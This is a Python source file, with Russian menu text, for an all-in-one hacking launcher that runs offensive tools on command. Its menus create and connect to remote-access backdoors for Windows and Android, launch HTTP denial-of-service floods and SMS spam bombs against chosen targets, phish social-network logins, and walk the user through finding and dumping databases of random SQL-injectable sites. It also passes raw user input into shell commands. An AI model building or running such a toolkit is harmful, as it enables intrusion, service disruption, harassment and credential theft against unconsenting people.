import os
import subprocess
import webbrowser
import time

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'

def config():
    rcc = open('android/config/config.txt', 'r')
    print(color.FAIL+color.BOLD+rcc.read()+color.END)
    time.sleep(0.5)

def welcome():
    while True:
        try:
            muni = input(color.DARKCYAN+'root@dushigub~# '+color.END)
            if muni.startswith('chat'):
                time.sleep(3)
                os.system('python3 server/client.py')
            if muni.startswith('routersploit'):
                os.system('clear')
                time.sleep(0.4)
                os.system('routehack/./rsf.py')
            if muni.startswith('windows exe'):
               while True:
                   try:
                       print(color.WARNING+'''
            Для создания нового бэкдора: now windows
            Для подключения к созданому файлу: start windows
            Для перемещения созданого файла в ваши файлы: storage
                       '''+color.END)
                       harie=input(color.DARKCYAN+'win@dushigub~# '+color.END)
                       if harie.startswith('storage'):
                          os.system('clear')
                          os.system('./storagwin.sh')
                       if harie.startswith('now windows'):
                          os.system('clear')
                          os.system('./windows.sh')
                       if harie.startswith('start windows'):
                          os.system('clear')
                          os.system('./connectwin.sh')
                   except:
                        print(color.FAIL+'Выход...'+color.END)
                        break

            if muni.startswith('start windows'):
               print(color.RED+'Сейчас будет тест на проникновение Windows'+color.END)
               time.sleep(2)
               print(color.RED+'Возможно мы не получим удаленный доступ...'+color.END)
               time.sleep(2)
               print(color.RED+'Надежднее взлом через файл exe для Windows'+color.END)
               time.sleep(2)
               print(color.RED+'Ну все... Приступаем к тестированию...'+color.END)
               time.sleep(2)
               os.system('./localhackwindows.sh')
            if muni.startswith('d test'):
               os.system('clear')
               print(color.FAIL+color.BOLD+'      WELCOME TO D-TEST'+color.END)
               time.sleep(1.9)
               os.system('python2 test/d-tect.py')
            if muni.startswith('exit'):
                exit()
            if muni.startswith('hack android'):
               while True:
                   try:
                       print(color.BOLD+'''
               Для выхода нажимай CTRL + C или exit

        Чтобы создать новое приложение: new apk
        Чтобы подключиться к созданым приложениям: start apk
        Для перемещения созданого приложения в ваши файлы: storage
                       '''+color.END)
                       hackandroi=input(color.DARKCYAN+'hack@dushigub~# '+color.END)
                       if hackandroi.startswith('now apk'):
                          os.system('clear')
                          time.sleep(0.6)
                          os.system('./android.sh')
                       elif hackandroi.startswith('storage'):
                            os.system('clear')
                            os.system('./storage.sh')

                       elif hackandroi.startswith('start apk'):
                            time.sleep(0.4)
                            os.system('clear')
                            os.system('./connecandroid.sh')
                   except:
                       print(color.FAIL+'Выход...'+color.END)
                       break

            if muni.startswith('ps grabber'):
                os.system('clear')
                time.sleep(1)
                os.system('python3 grabber.py')
            if muni.startswith('phonesploit'):
                os.system('clear')
                print(color.FAIL+'Ожидайте...'+color.END)
                time.sleep(0.9)
                os.system('clear')
                os.system('python2 main_linux.py')


            if muni.startswith('scan'):
                while True:
                    try:
                        os.system('clear')
                        time.sleep(0.3)
                        os.system('./scanstart.sh')
                        break
                    except:
                        print('Выход из scan')
                        time.sleep(0.5)
                        break

            if muni.startswith('dos http'):
                while True:
                    try:
                        dos=input(color.DARKCYAN+'dos@dushigub~# '+color.END)
                        if dos.startswith('help'):
                            print(color.WARNING+color.BOLD+'''
        Чтобы начать аттаку: start dos
        Выход: exit
                            ''')
                        if dos.startswith('start dos'):
                            print(color.FAIL+color.BOLD+'''
        USAGE:<URL> [OPTIONS]

        OPTIONS:
        Flag			Description					Default
        -u, --useragents	File with user-agents to use			(default: randomly generated)
        -w, --workers		Number of concurrent workers			(default: 10)
        -s, --sockets		Number of concurrent sockets			(default: 500)
        -m, --method		HTTP Method to use 'get' or 'post'  or 'random'(default: get)
        -n, --nosslcheck	Do not verify SSL Certificate			(default: True)
        -d, --debug		Enable Debug Mode [more verbose output]		(default: False)
        -h, --help		Shows this help


        ПРИШЛИ МНЕ ССЫЛКУ HTTP
        CTRL+C для выхода из DOS
        USAGE: http://188.245.43.12 -s 1000 -m get
                            '''+color.END)
                            ddos=input(color.FAIL+color.BOLD+'DOS@START~# '+color.END)
                            if ddos.startswith(ddos):
                                os.system('dos/./goldeneye.py '+ddos)

                        if dos.startswith('clear'):
                           os.system('clear')
                        if dos.startswith('exit'):
                           print(color.WARNING+'Выполняю выход из DOS'+color.END)
                           break
                    except:
                        print(color.WARNING+'Выполняю выход из DOS'+color.END)
                        break

            if muni.startswith('username'):
               while True:
                         try:
                            user=input(color.DARKCYAN+'user@dushigub~# '+color.END)
                            if user.startswith('clear'):
                                os.system('clear')
                            if user.startswith('start'):
                               os.system('name/./username.sh')
                            if user.startswith('help'):
                                print(color.BOLD+'''
            Для выхода нажмите: exit
            Для пробива по никнему: start
                                '''+color.END)
                            if user.startswith('exit'):
                                time.sleep(0.2)
                                break
                         except:
                             print(color.FAIL+'Вы вышли из раздела username'+color.END)
                             time.sleep(0.3)
                             break

            if muni.startswith('sqlmap'):
                print(color.WARNING+'Вы вошли в раздел sqlmap! Напишите help.')
                while True:
                    try:
                        sqlmap=input(color.DARKCYAN+'sqlamp@dushigub~# '+color.END)
                        if sqlmap.startswith('start sqlmap'):
                            while True:
                                try:
                                   sqlmap2=input(color.DARKCYAN+'sql@dushigub~# '+color.END)
                                   if sqlmap2.startswith(sqlmap2):
                                      os.system('sqlmap/./sqlmap.py -u '+sqlmap2)
                                   if sqlmap2.startswith('exit'):
                                      break
                                except:
                                    print(color.WARNING+'Выход'+color.END)
                                    break

                        if sqlmap.startswith('help'):
                            print(color.BOLD+'''
        Надо найти сайт с уязвимостью php?id=
        Это можно сделать в гугле, написав php?id=
        В адресную строку.

        Что косаемо sqlmap, сначала пишем --dbs
        Потом -D это и есть --dbs, просто если нам показало базу данных
        То пишем -D БАЗАДАННЫХ(bazasdb) --tebles
        Если выдал информацию, то аргумент -D bazadb -T user --dump
        Где написал User, там может быть что угодно.
        Пришли мне сайт, и в конец напиши
        --dbs или --random-agent --threads 10 --eta --dbs --risk 3 --level 4

        Пример: https://www.tutsait.com/php?id=65 --dbs --risk 2
        Напиши start sqlmap если готов взламывать сайт)
                            '''+color.BOLD)
                        if sqlmap.startswith('clear'):
                            os.system('clear')

                        if sqlmap.startswith('exit'):
                            print(color.FAIL+'Вы вышли из раздела sqlmap'+color.END)
                            break
                    except:
                       print(color.WARNING+'Выход из раздела sqlmap'+color.END)
                       break

            if muni.startswith('fishing'):
                time.sleep(0.2)
                while True:
                    try:
                        fishing=input(color.DARKCYAN+'fishing@dushigub~# '+color.END)
                        if fishing.startswith('help'):
                            print(color.BOLD+'''
        Работает обычно на wifi, но если он тебе выдал ссылку. Значит выдал.
        Просто ngrok проводит трафик через порты 80-443,
        а на мобильных данных они закрыты обычно)

        Самый обычный фишинг: fishing
        Для этого софта нужнен root: setoolkit
        Для выхода: exit
                            '''+color.END)
                        if fishing.startswith('clear'):
                           os.system('clear')
                        if fishing.startswith('fishing'):
                           os.system('./atak.sh')
                        if fishing.startswith('setoolkit'):
                           os.system('fishing/set/./setoolkit')
                        if fishing.startswith('exit'):
                           print(color.FAIL+'Выход из раздела fishing'+color.END)
                           time.sleep(0.3)
                           break
                    except:
                        print(color.FAIL+'Выход из раздела fishing'+color.END)
                        break

            if muni.startswith('ip'):
                os.system('clear')
                print(color.BOLD+'''
        Напишите ipaddr, для того чтобы узнать информацию...
        Для выхода напишите: CTRL+C
                '''+color.BOLD)
                while True:
                    try:
                        ipd=input(color.DARKCYAN+'ip@dushigub~# '+color.END)
                        if ipd.startswith('ipaddr'):
                           os.system('clear')
                           print(color.FAIL+'Напиши мне ip-addres, затем нажми enter'+color.END)
                           id=input(color.DARKCYAN+'ipaddres@dushigub~# '+color.END)
                           if id.startswith(id):
                              os.system('whois '+id+' > whois/whois.txt')
                              ipdd = open('whois/whois.txt', 'r')
                              print(color.BOLD + ipdd.read() + color.END)
                        if ipd.startswith('help'):
                            print(color.BOLD+'''
        Для выхода напишите: exit
        Чтобы узнать информацию повторно: ipaddr
                            '''+color.END)
                        if ipd.startswith('exit'):
                            print(color.FAIL+'Вы вышли из раздела IP'+color.END)
                            break
                    except:
                        print('Вы вышли из раздела ip')
                        break

            if muni.startswith('server'):
                print(color.BOLD+'''
        Пришли мне ip addres
        Я жду... Для выхода нажми CTRL+C
                '''+color.END)
                scanners = input(color.DARKCYAN+'info@server~# '+color.END)
                if scanners.startswith(scanners):
                    print(color.BOLD+'''
        Ждите...
                    '''+color.END)
                    os.system('nmap '+scanners+' > scanner.txt')
                    time.sleep(0.2)
                    f = open("scanner.txt", "r")
                    print(color.BOLD + f.read() + color.END)
                    time.sleep(0.2)
                    subprocess.call("./scanner.sh", shell=True)


            if muni.startswith('help'):
                print(color.BOLD +'''
        Зайти в чат: chat
        Для спам атаки напишите: spam
        Для информации о ip-addrese: ip
        Для пробива человека по никнейму: username
        Для информатиции о сервере и открытых портов(nmap): server
        Узнать список устройств, в локальной сети: wifi
        Поиск ip из Shodan возможно с уязвимостью: ps grabber
        Создать вирус удаленного доступа: hack android
        Подключиться к телефону по ip: phonesploit
        Доменирование сетью bettercap(root): scan
        Dos атака на протокол http, не на https: dos http
        Фишинг социальных сетей: fishing
        Взломать роутер: routersploit
        Взломать windows без бэкдора: start windows
        Взлом Windows через exe файл: windows exe
        Поиск уязвимостей на сайтах, взлом сайтов: d test
        Взломать сайт с уязмимостью php?id=: sqlamp

        Выход из программы: exit
        Очистить экран: clear
                '''+ color.END)

            if muni.startswith('clear'):
                os.system('clear')

            if muni.startswith('wifi'):
                time.sleep(7)
                print('Приступаю...')
                os.system('clear')
                os.system("ip route show | awk '{ print $1 }' > ipstart.txt")
                print(color.BOLD+'''
        Ждите...
                    '''+color.END)
                os.system('nmap -iL ipstart.txt')
                time.sleep(0.2)
                time.sleep(10)
                os.system('rm ipstart.txt')
                talk('Это-весь-список')

            if muni.startswith('spam'):
               print(color.BOLD+color.FAIL+'Для выхода нажмите CTRL + C'+color.END)
               while True:
                   try:
                       print(color.BOLD+color.WARNING+'''
        Повторить атаку ранее настроенную: replay
        Восстановить атаку: start spam

                       ''')
                       hacking=input(color.DARKCYAN+'spam@dushigub~# '+color.END)
                       if hacking.startswith('start spam'):
                           os.system('rm spams.py')
                           os.system('clear')
                           print(color.BOLD+color.WARNING+'Пример: 7999999999, а не +7999999999')
                           nomers = input(color.FAIL+'Номер для спам атаки: '+color.END)
                           taim = input(color.FAIL+'Укажите таймаут отправки смс: '+color.END)
                           with open('spams.py', 'w') as nomer:
                                 nomer.write('''
import os
import time

print('Запускаю атаку на номер: '''+str(nomers)+'''')
os.system("python2 spammer.py '''+str(nomers)+''' --delay '''+str(taim)+'''")
                               ''')
                           print('Все готово!')
                           os.system('chmod +x spams.py')
                           os.system('python3 spams.py')

                       if hacking.startswith('replay'):
                          os.system('chmod +x spams.py')
                          os.system('python3 spams.py')
                          os.system('clear')

                   except:
                       print(color.FAIL+'Вы вышли из раздела spam'+color.END)
                       break
        except:
            print("Вы вернулись")
            os.system('clear')
            time.sleep(0.2)
            exit()
